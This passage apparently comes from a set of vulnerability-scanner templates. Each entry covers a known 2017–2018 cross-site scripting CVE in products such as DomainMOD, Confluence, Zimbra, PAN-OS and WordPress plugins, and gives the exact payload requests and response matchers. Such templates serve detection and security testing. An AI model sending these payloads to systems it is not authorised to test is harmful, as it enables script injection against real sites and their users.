- {{BaseURL}}/sgdadmin/faces/com_sun_web_ui/help/helpwindow.jsp?=&windowTitle=AdministratorHelpWindow>\</TITLE>\</HEAD>\<body>\<script>alert(1337)\</script>\<!--&>helpFile=concepts.html
### Matchers

**Type - word**
- words
    1. \<script>alert(1337)\</script>\<!--\</TITLE>
- part - body

---
# DomainMOD 4.11.01 - Cross-Site Scripting
## Description
- DomainMOD 4.11.01 contains a cross-site scripting vulnerability via assets/add/dns.php Profile Name or notes field.

- severity - medium
- tags - cve2018,domainmod,xss,authenticated,edb,cve
## Requests
### Step - 1
```
POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

new_username={{username}}&new_password={{password}}

```
### Step - 2
```
POST /assets/add/dns.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

new_name=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&new_dns1=abc&new_ip1=&new_dns2=abc&new_ip2=&new_dns3=abc&new_ip3=&new_dns4=&new_ip4=&new_dns5=&new_ip5=&new_dns6=&new_ip6=&new_dns7=&new_ip7=&new_dns8=&new_ip8=&new_dns9=&new_ip9=&new_dns10=&new_ip10=&new_notes=%3Cscript%3Ealert%281%29%3C%2Fscript%3E

```
### Step - 3
```
GET /assets/dns.php HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - dsl**
- dsl
    1. status_code_3 == 200
    2. contains(all_headers_3, "text/html")
    3. contains(body_3, ">\<script>alert(document.domain)\</script>\</a>")
- condition - and

---
# Atlassian Jira Confluence - Cross-Site Scripting
## Description
- Atlassian Jira Confluence before version 7.6.6, from version 7.7.0 before version 7.7.4, from version 7.8.0 before version 7.8.4, and from version 7.9.0 before version 7.9.2, allows remote attackers to inject arbitrary HTML or JavaScript via a cross-site scripting vulnerability in the error message of custom fields when an invalid value is specified.

- severity - medium
- tags - cve,cve2018,atlassian,confluence,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/pages/includes/status-list-mo%3Ciframe%20src%3D%22javascript%3Aalert%28document.domain%29%22%3E.vm
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- part - body
- words
    1. \<iframe src="javascript:alert(document.domain)">
    2. confluence
- condition - and

**Type - word**
- part - header
- words
    1. text/html

---
# SugarCRM 3.5.1 - Cross-Site Scripting
## Description
- SugarCRM 3.5.1 is vulnerable to cross-site scripting via phprint.php and a parameter name in the query string (aka a $key variable).
- severity - medium
- tags - sugarcrm,xss,edb,cve,cve2018
## Requests
- Method - GET
### URL
- {{BaseURL}}/index.php?action=Login&module=Users&print=a&%22%2F%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
### Matchers

**Type - word**
- part - body
- words
    1. &"/>\<script>alert(1)\</script>=&">\<\< Back\</a>\<br>\<br>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# OEcms 3.1 - Cross-Site Scripting
## Description
- OEcms 3.1 is vulnerable to reflected cross-site scripting via the mod parameter of info.php.
- severity - medium
- tags - cve,cve2018,xss,edb
## Requests
- Method - GET
### URL
- {{BaseURL}}/cms/info.php?mod=list%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Adiscon LogAnalyzer \<4.1.7 - Cross-Site Scripting
## Description
- Adiscon LogAnalyzer before 4.1.7 contains a cross-site scripting vulnerability in the 'referer' parameter of the login.php file.

- severity - medium
- tags - adiscon,xss,edb,cve,cve2018
## Requests
- Method - GET
### URL
- {{BaseURL}}/src/login.php?referer=%22%3E%3Cscript%3Econfirm(document.domain)%3C/script%3E
### Matchers

**Type - word**
- part - body
- words
    1. value="">\<script>confirm(document.domain)\</script>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# DomainMOD 4.11.01 - Cross-Site Scripting
## Description
- DomainMOD 4.11.01 is vulnerable to reflected cross-site Scripting via assets/edit/ip-address.php.

- severity - medium
- tags - cve,cve2018,domainmod,xss,authenticated
## Requests
### Step - 1
```
POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

new_username={{username}}&new_password={{password}}

```
### Step - 2
```
GET /assets/edit/ip-address.php?ipid=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&del=1 HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. \<script>alert(document.domain)\</script>&really_del

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# DomainMOD 4.11.01 - Cross-Site Scripting
## Description
- DomainMOD through version 4.11.01 is vulnerable to cross-site scripting via the /assets/add/category.php CatagoryName and StakeHolder parameters.

- severity - medium
- tags - domainmod,xss,authenticated,edb,cve,cve1028
## Requests
### Step - 1
```
POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

new_username={{username}}&new_password={{password}}

```
### Step - 2
```
POST /assets/add/category.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

new_category=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&new_stakeholder=&new_notes=

```
### Step - 3
```
GET /assets/categories.php HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - dsl**
- dsl
    1. status_code_3 == 200
    2. contains(all_headers_3, "text/html")
    3. contains(body_3, ">\<script>alert(document.domain)\</script>\</a>")
- condition - and

---
# WordPress wpForo Forum \<= 1.4.11 - Cross-Site Scripting
## Description
- WordPress wpForo Forum plugin before 1.4.12 for WordPress allows unauthenticated reflected cross-site scripting via the URI.
- severity - medium
- tags - cve,cve2018,wordpress,xss,wp-plugin
## Requests
- Method - GET
### URL
- {{BaseURL}}/index.php/community/?%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Synacor Zimbra Collaboration Suite Collaboration \<8.8.11 - Cross-Site Scripting
## Description
- Synacor Zimbra Collaboration Suite Collaboration before 8.8.11 is vulnerable to cross-site scripting via the AJAX and html web clients.
- severity - medium
- tags - cve,cve2018,xss,zimbra
## Requests
- Method - GET
### URL
- {{BaseURL}}/zimbra/h/search?si=1&so=0&sfi=4&st=message&csi=1&action=&cso=0&id=%22%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - status**
- status
    1. 200

**Type - word**
- part - header
- words
    1. text/html

---
# DomainMOD 4.11.01 - Cross-Site Scripting
## Description
- DomainMOD 4.11.01 contains a cross-site scripting vulnerability via /admin/ssl-fields/add.php Display Name, Description & Notes field parameters.

- severity - medium
- tags - cve,cve2018,domainmod,xss,authenticated,edb
## Requests
### Step - 1
```
POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

new_username={{username}}&new_password={{password}}

```
### Step - 2
```
POST /admin/ssl-fields/add.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

new_name=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&new_field_name=new&new_field_type_id=1&new_description=test&new_notes=test

```
### Step - 3
```
GET /admin/ssl-fields/ HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. ">\<script>alert(document.domain)\</script>\</a>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# DomainMOD 4.11.01 - Cross-Site Scripting
## Description
- DomainMOD 4.11.01 is vulnerable to cross-site scripting via the segments/add.php Segment Name field.

- severity - medium
- tags - cve,cve2018,domainmod,xss,authenticated
## Requests
### Step - 1
```
POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

new_username={{username}}&new_password={{password}}

```
### Step - 2
```
POST /segments/add.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

new_name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&raw_domain_list=test.com&new_description=test&new_notes=test

```
### Step - 3
```
GET /segments/ HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

```
### Matchers

**Type - word**
- part - body
- words
    1. \<script>alert(1)\</script>\</a>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# DomainMOD 4.11.01 - Cross-Site Scripting
## Description
- DomainMOD through 4.11.01 contains a cross-site scripting vulnerability via the assets/add/registrar.php notes field for Registrar.

- severity - medium
- tags - cve,cve2018,domainmod,xss,authenticated,edb
## Requests
### Step - 1
```
POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

new_username={{username}}&new_password={{password}}

```
### Step - 2
```
POST /assets/add/registrar.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

new_registrar=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&new_url=test&new_api_registrar_id=0&new_notes=test

```
### Step - 3
```
GET /assets/registrars.php HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. ">\<script>alert(document.domain)\</script>\</a>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Zend Server \<9.13 - Cross-Site Scripting
## Description
- Zend Server before version 9.13 is vulnerable to cross-site scripting via the debug_host parameter.

- severity - medium
- tags - cve,cve2018,xss,zend
## Requests
- Method - GET
### URL
- {{BaseURL}}/index.php?debug_host=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&start_debug=1
### Matchers

**Type - word**
- part - body
- words
    1. \</script>\<script>alert(document.domain)\</script>
    2. is not allowed to open debug sessions
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Oracle Fusion Middleware WebCenter Sites - Cross-Site Scripting
## Description
- The Oracle WebCenter Sites component of Oracle Fusion Middleware is susceptible to multiple instances of cross-site scripting that could allow unauthenticated attackers with network access via HTTP to compromise Oracle WebCenter Sites. Impacted versions that are affected are 11.1.1.8.0, 12.2.1.2.0 and 12.2.1.3.0. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Oracle WebCenter Sites, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in unauthorized access to critical data or complete access to all Oracle WebCenter Sites accessible data as well as unauthorized update, insert or delete access to some of Oracle WebCenter Sites accessible data.
- severity - high
- tags - edb,cve,cve2018,oracle,xss,wcs
## Requests
### Step - 1
```
GET /cs/Satellite?pagename=OpenMarket/Gator/FlexibleAssets/AssetMaker/confirmmakeasset&cs_imagedir=qqq%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1
Host: {{BaseURL}}

```
### Step - 2
```
GET /cs/Satellite?destpage="<h1xxx"><script>alert(document.domain)</script>&pagename=OpenMarket%2FXcelerate%2FUIFramework%2FLoginError HTTP/1.1
Host: {{BaseURL}}

```
### Matchers

**Type - word**
- part - body
- words
    1. \<script>alert(document.domain)\</script>/graphics/common/screen/dotclear.gif

**Type - word**
- part - body
- words
    1. \<script>alert(24)\</script>
    2. Missing translation key
- condition - and

---
# DomainMOD 4.11.01 - Cross-Site Scripting
## Description
- DomainMOD 4.11.01 contains a cross-site scripting vulnerability via assets/add/account-owner.php Owner name field.

- severity - medium
- tags - cve,cve2018,domainmod,xss,authenticated,edb
## Requests
### Step - 1
```
POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

new_username={{username}}&new_password={{password}}

```
### Step - 2
```
POST /assets/add/account-owner.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

new_owner=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&new_notes=

```
### Step - 3
```
GET /assets/account-owners.php HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - dsl**
- dsl
    1. status_code_3 == 200
    2. contains(all_headers_3, "text/html")
    3. contains(body_3, '>\<script>alert(document.domain)\</script>\</a>')
- condition - and

---
# DomainMOD 4.11.01 - Cross-Site Scripting
## Description
- DomainMOD 4.11.01 is vulnerable to reflected cross-site scripting via assets/edit/registrar-account.php.

- severity - medium
- tags - edb,cve,cve2018,domainmod,xss,authenticated
## Requests
### Step - 1
```
POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

new_username={{username}}&new_password={{password}}

```
### Step - 2
```
GET /assets/edit/registrar-account.php?raid=hello%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E&del=1 HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. ">\<script>alert(document.domain)\</script>&really_del=1">YES

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# SolarWinds Database Performance Analyzer 11.1.457 - Cross-Site Scripting
## Description
- SolarWinds Database Performance Analyzer 11.1.457 contains a reflected cross-site scripting vulnerability in its idcStateError component, where the page parameter is reflected into the HREF of the 'Try Again' Button on the page, aka a /iwc/idcStateError.iwc?page= URI.
- severity - medium
- tags - cve,cve2018,solarwinds,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/iwc/idcStateError.iwc?page=javascript%3aalert(document.domain)%2f%2f
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- words
    1. \<a href="javascript:alert(document.domain)//

---
# WordPress sitepress-multilingual-cms 3.6.3 - Cross-Site Scripting
## Description
- WordPress plugin sitepress-multilingual-cms 3.6.3 is vulnerable to cross-site scripting in process_forms via any locale_file_name_ parameter (such as locale_file_name_en) in an authenticated theme-localization.php request to wp-admin/admin.php.
- severity - medium
- tags - cve,cve2018,wordpress,xss,plugin
## Requests
- Method - POST
- Method - POST
### URL
- {{BaseURL}}/wp-admin/admin.php
  - icl_post_action=save_theme_localization&locale_file_name_en=EN"><script>alert(0);</script>

### Matchers

**Type - dsl**
- dsl
    1. contains(tolower(all_headers), "text/html")
    2. contains(set_cookie, "_icl_current_admin_language")
    3. contains(body, "\">\<script>alert(0);\</script>")
- condition - and

---
# WordPress SagePay Server Gateway for WooCommerce \<1.0.9 - Cross-Site Scripting
## Description
- WordPress SagePay Server Gateway for WooCommerce before 1.0.9 is vulnerable to cross-site scripting via the includes/pages/redirect.php page parameter.
- severity - medium
- tags - cve2018,wordpress,xss,wp-plugin,woocommerce,packetstorm,cve
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/sagepay-server-gateway-for-woocommerce/includes/pages/redirect.php?page=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Dolibarr \<7.0.2 - Cross-Site Scripting
## Description
- Dolibarr before 7.0.2  is vulnerable to cross-site scripting and allows remote attackers to inject arbitrary web script or HTML via the foruserlogin parameter to adherents/cartes/carte.php.

- severity - medium
- tags - cve,cve2018,xss,dolibarr
## Requests
- Method - GET
### URL
- {{BaseURL}}/dolibarr/adherents/cartes/carte.php?&mode=cardlogin&foruserlogin=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&model=5160&optioncss=print
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - status**
- status
    1. 200

**Type - word**
- part - header
- words
    1. text/html

---
# DomainMOD 4.11.01 - Cross-Site Scripting
## Description
- DomainMOD through version 4.11.01 is vulnerable to cross-site scripting via the /assets/add/ssl-provider.php ssl-provider-name and ssl-provider's-url parameters.

- severity - medium
- tags - domainmod,xss,authenticated,edb,cve,cve2018
## Requests
### Step - 1
```
POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

new_username={{username}}&new_password={{password}}

```
### Step - 2
```
POST /assets/add/ssl-provider.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

new_ssl_provider=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&new_url=&new_notes=

```
### Step - 3
```
GET /assets/ssl-providers.php HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - dsl**
- dsl
    1. status_code_3 == 200
    2. contains(all_headers_3, "text/html")
    3. contains(body_3, ">\<script>alert(document.domain)\</script>\</a>")
- condition - and

---
# Planon \<Live Build 41 - Cross-Site Scripting
## Description
- Planon before Live Build 41 is vulnerable to cross-site scripting.
- severity - medium
- tags - xss,cve,cve2018,planon
## Requests
- Method - GET
### URL
- {{BaseURL}}/wicket/resource/nl.planon.pssm.dashboard.cre.engine.wicket.page.AbstractDashboardPage/html/nodata.html?nodatamsg=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- words
    1. text/html
- part - header

---
# WordPress JSmol2WP \<=1.07 - Cross-Site Scripting
## Description
- WordPress JSmol2WP version 1.07 and earlier is vulnerable to cross-site scripting and allows remote attackers to inject arbitrary web script or HTML via the jsmol.php data parameter.
- severity - medium
- tags - cve,cve2018,wordpress,xss,wp-plugin
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=saveFile&data=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&mimetype=text/html;%20charset=utf-8
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Apache ActiveMQ \<=5.15.5 - Cross-Site Scripting
## Description
- Apache ActiveMQ versions 5.0.0 to 5.15.5 are vulnerable to cross-site scripting via the web based administration console on the queue.jsp page. The root cause of this issue is improper data filtering of the QueueFilter parameter.
- severity - medium
- tags - cve,cve2018,apache,activemq,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/admin/queues.jsp?QueueFilter=yu1ey%22%3e%3cscript%3ealert(%221%22)%3c%2fscript%3eqb68
### Matchers

**Type - word**
- words
    1. ">\<script>alert("1")\</script>

**Type - word**
- words
    1. /html
- part - header

**Type - status**
- status
    1. 200

---
# Oracle Fusion Middleware WebCenter Sites 11.1.1.8.0 - Cross-Site Scripting
## Description
- The Oracle WebCenter Sites 11.1.1.8.0 component of Oracle Fusion Middleware is impacted by easily exploitable cross-site scripting vulnerabilities that allow high privileged attackers with network access via HTTP to compromise Oracle WebCenter Sites.
- severity - medium
- tags - cve,cve2018,oracle,wcs,xss
## Requests
### Step - 1
```
GET /cs/Satellite?pagename=OpenMarket/Gator/FlexibleAssets/AssetMaker/complexassetmaker&cs_imagedir=qqq"><script>alert(document.domain)</script> HTTP/1.1
Host: {{Hostname}}

```
### Step - 2
```
GET /cs/Satellite?pagename=OpenMarket%2FXcelerate%2FActions%2FSecurity%2FNoXceleditor&WemUI=qqq%27;}%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1
Host: {{Hostname}}

```
### Step - 3
```
GET /cs/Satellite?pagename=OpenMarket%2FXcelerate%2FActions%2FSecurity%2FProcessLoginRequest&WemUI=qqq%27;}%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. \<script>alert(document.domain)\</script>/graphics/common/screen/dotclear.gif

**Type - word**
- part - body
- words
    1. \<script>alert(document.domain)\</script>
    2. Variables.cs_imagedir
- condition - and

---
# Jolokia 1.3.7 - Cross-Site Scripting
## Description
- Jolokia 1.3.7 is vulnerable to cross-site scripting in the HTTP servlet and allows an attacker to execute malicious JavaScript in the victim's browser.

- severity - medium
- tags - cve,cve2018,jolokia,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/api/jolokia/read\<svg%20onload=alert(document.domain)>?mimeType=text/html
- {{BaseURL}}/jolokia/read\<svg%20onload=alert(document.domain)>?mimeType=text/html
### Matchers

**Type - word**
- part - body
- words
    1. \<svg onload=alert(document.domain)>
    2. java.lang.IllegalArgumentException
    3. No type with name
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Palo Alto Networks PAN-OS GlobalProtect \<8.1.4 - Cross-Site Scripting
## Description
- Palo Alto Networks PAN-OS before 8.1.4 GlobalProtect Portal Login page allows an unauthenticated attacker to inject arbitrary JavaScript or HTML, making it vulnerable to cross-site scripting.
- severity - medium
- tags - cve,cve2018,panos,vpn,globalprotect,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/global-protect/login.esp?user=j%22;-alert(1)-%22x
### Matchers

**Type - word**
- part - body
- words
    1. var valueUser = "j";-alert(1)-"x";

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# DomainMOD 4.11.01 - Cross-Site Scripting
## Description
- DomainMOD 4.11.01 contains a cross-site scripting vulnerability via /domain//admin/dw/add-server.php DisplayName parameters.

- severity - medium
- tags - cve2018,domainmod,xss,authenticated,edb,cve
## Requests
### Step - 1
```
POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

new_username={{username}}&new_password={{password}}

```
### Step - 2
```
POST /admin/dw/add-server.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

new_name=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&new_host=abc&new_protocol=https&new_port=2086&new_username=abc&new_api_token=255&new_hash=&new_notes=

```
### Step - 3
```
GET /admin/dw/servers.php HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. ">\<script>alert(document.domain)\</script>\</a>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Grav CMS \<1.3.0 - Cross-Site Scripting
## Description
- Grav CMS before 1.3.0 is vulnerable to cross-site scripting via system/src/Grav/Common/Twig/Twig.php and allows remote attackers to inject arbitrary web script or HTML via the PATH_INFO to admin/tools.

- severity - medium
- tags - cve,cve2018,xss,grav
## Requests
- Method - GET
### URL
- {{BaseURL}}/admin/tools/a--%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - status**
- status
    1. 200

**Type - word**
- part - header
- words
    1. text/html

---
# DomainMOD 4.11.01 - Cross-Site Scripting
## Description
- DomainMOD through version 4.11.01 is vulnerable to cross-site scripting via the /assets/add/ssl-provider-account.php Username field.

- severity - medium
- tags - domainmod,xss,authenticated,edb,cve,cve2018
## Requests
### Step - 1
```
POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

new_username={{username}}&new_password={{password}}

```
### Step - 2
```
POST /assets/add/ssl-provider-account.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

new_ssl_provider_id=1&new_owner_id=1&new_email_address=&new_username=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&new_password=&new_reseller=0&new_reseller_id=&new_notes=

```
### Step - 3
```
GET /assets/ssl-accounts.php HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - dsl**
- dsl
    1. status_code_3 == 200
    2. contains(all_headers_3, "text/html")
    3. contains(body_3, ">\<script>alert(document.domain)\</script>\</a>")
- condition - and

---
# BIBLIOsoft BIBLIOpac 2008 - Cross-Site Scripting
## Description
- BIBLIOsoft BIBLIOpac 2008 contains a cross-site scripting vulnerability via the db or action parameter to bin/wxis.exe/bibliopac/, which allows a remote attacker to inject arbitrary web script or HTML.

- severity - medium
- tags - cve,cve2018,xss,bibliopac,bibliosoft
## Requests
- Method - GET
### URL
- {{BaseURL}}/bibliopac/bin/wxis.exe/bibliopac/?IsisScript=bibliopac/bin/bibliopac.xic&db=">\<script>prompt(document.domain)\</script>
### Matchers

**Type - word**
- part - body
- words
    1. ">\<script>prompt(document.domain)\</script>.xrf

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# FortiGate SSL VPN Web Portal - Cross Site Scripting
## Description
- Failure to sanitize the login redir parameter in the SSL-VPN web portal may allow an attacker to perform a Cross-site Scripting (XSS) or an URL Redirection attack.

- severity - medium
- tags - cve,cve2017,fortigate,xss,fortinet
## Requests
- Method - GET
### URL
- {{BaseURL}}/remote/loginredir?redir=javascript:alert(document.domain)
### Matchers

**Type - word**
- part - body
- words
    1. location=decodeURIComponent("javascript%3Aalert%28document.domain%29"

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# AvantFAX 3.3.3 - Cross-Site Scripting
## Description
- AvantFAX 3.3.3 contains a cross-site scripting vulnerability via an arbitrary parameter name submitted to the default URL, as demonstrated by a parameter whose name contains a SCRIPT element and whose value is 1.
- severity - medium
- tags - avantfax,hackerone,packetstorm,cve,cve2017,xss
## Requests
### Step - 1
```
POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username=admin&password=admin&_submit_check=1&jlbqg<script>alert("{{randstr}}")</script>b7g0x=1

```
### Matchers

**Type - word**
- words
    1. \<script>alert("{{randstr}}")\</script>
    2. AvantFAX
- part - body
- condition - and

**Type - status**
- status
    1. 200

**Type - word**
- part - header
- words
    1. text/html

---
# Django Debug Page - Cross-Site Scripting
## Description
- Django 1.10.x before 1.10.8 and 1.11.x before 1.11.5 has HTML autoescaping  disabled in a portion of the template for the technical 500 debug page. Given the right circumstances, this allows a cross-site scripting attack. This vulnerability shouldn't affect most production sites since run with "DEBUG = True" is not on by default (which is what makes the page visible).

- severity - medium
- tags - xss,django,cve,cve2017
## Requests
- Method - GET
### URL
- {{BaseURL}}/create_user/?username=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \<script>alert(document.domain)\</script>
- part - body

**Type - status**
- status
    1. 200

**Type - word**
- words
    1. text/html
- part - header

---
# Magmi 0.7.22 - Cross-Site Scripting
## Description
- Magmi 0.7.22 contains a cross-site scripting vulnerability due to insufficient filtration of user-supplied data (prefix) passed to the magmi-git-master/magmi/web/ajax_gettime.php URL.
- severity - medium
- tags - cve,cve2017,magmi,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/magmi/web/ajax_gettime.php?prefix=%22%3E%3Cscript%3Ealert(document.domain);%3C/script%3E%3C
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- part - body
- words
    1. ">\<script>alert(document.domain);\</script>\<

**Type - word**
- part - header
- words
    1. text/html

---
# WordPress Emag Marketplace Connector 1.0 - Cross-Site Scripting
## Description
- WordPress Emag Marketplace Connector plugin 1.0 contains a reflected cross-site scripting vulnerability because the parameter "post" to /wp-content/plugins/emag-marketplace-connector/templates/order/awb-meta-box.php is not filtered correctly.
- severity - medium
- tags - xss,wp-plugin,packetstorm,cve,cve2017,wordpress
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/emag-marketplace-connector/templates/order/awb-meta-box.php?post=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Raygun4WP \<=1.8.0 - Cross-Site Scripting
## Description
- WordPress Raygun4WP 1.8.0 contains a reflected cross-site scripting vulnerability via sendtesterror.php.
- severity - medium
- tags - cve,cve2017,wordpress,xss,wp-plugin
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/raygun4wp/sendtesterror.php?backurl=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# FineCMS \<=5.0.10 - Cross-Site Scripting
## Description
- FineCMS through 5.0.10 contains a cross-site scripting vulnerability in controllers/api.php via the function parameter in a c=api&m=data2 request.

- severity - medium
- tags - cve,cve2017,xss,finecms
## Requests
- Method - GET
### URL
- {{BaseURL}}/index.php?c=api&m=data2&function=%3Cscript%3Ealert(document.domain)%3C/script%3Ep&format=php
### Matchers

**Type - word**
- part - body
- words
    1. \<script>alert(document.domain)\</script>p不存在

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Stop User Enumeration \<=1.3.7 - Cross-Site Scripting
## Description
- WordPress Stop User Enumeration 1.3.7 and earlier are vulnerable to unauthenticated reflected cross-site scripting.
- severity - medium
- tags - wpscan,cve,cve2017,wordpress,xss,wp-plugin
## Requests
- Method - GET
### URL
- {{BaseURL}}/?author=1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# McAfee Network Data Loss Prevention 9.3.x - Cross-Site Scripting
## Description
- McAfee Network Data Loss Prevention User-Agent 9.3.x contains a cross-site scripting vulnerability which allows remote attackers to get session/cookie information via modification of the HTTP request.
- severity - medium
- tags - cve,cve2017,mcafee,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - word**
- part - body
- words
